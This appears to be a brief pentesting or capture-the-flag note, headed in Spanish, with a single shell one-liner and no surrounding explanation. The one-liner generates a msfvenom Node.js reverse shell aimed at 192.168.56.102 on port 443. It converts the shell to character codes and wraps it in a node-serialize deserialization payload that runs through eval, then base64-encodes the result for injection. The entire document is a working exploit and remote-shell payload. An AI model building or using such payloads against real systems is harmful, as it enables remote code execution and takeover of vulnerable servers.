## Reverse shell con msfvenom

    for p in $(msfvenom -p nodejs/shell_reverse_tcp lhost=192.168.56.102 lport=443 -f raw 2>/dev/null | grep -o .|sed 's/.*/x&x/');
    do if [ "$p" == "x" ]; then echo -n "32,"; 
    else printf "%d," "'${p:1:1}" ; 
    fi; 
    done | sed 's/.*/{"rce":"_$$ND_FUNC$$_function (){ eval(String.fromCharCode(&32))}()"}/' | base64 -w0
